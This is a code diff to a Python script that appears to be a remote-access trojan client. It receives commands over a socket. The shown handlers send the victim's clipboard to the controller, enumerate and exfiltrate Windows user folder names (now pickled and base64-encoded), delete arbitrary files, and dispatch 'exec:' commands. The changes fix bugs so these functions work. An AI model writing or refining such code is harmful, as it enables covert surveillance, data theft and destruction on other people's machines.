@@ -7,7 +7,8 @@ import pyautogui
 import io
 import clipboard
 import os
-
+import pickle
+import codecs
 
 # TODO: conn keepalive
 # sock.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 60000, 30000))
@@ -70,9 +71,9 @@ while True:
         text = clipboard.paste()
         send_msg(sock, text.encode())
     elif msg == "users":
-        users = next(os.walk("C:\Users"), (None, None, []))[2]
-        send_msg(sock, users.encode())
-    elif msg.startswith() == 'delete':
+        users = next(os.walk("C:\\Users"), (None, None, []))[1]
+        send_msg(sock, codecs.encode(pickle.dumps(users), "base64"))
+    elif msg.startswith('delete'):
         file_name = msg[msg.index(' '):]
         os.remove(file_name)
     elif msg.startswith("exec:"):
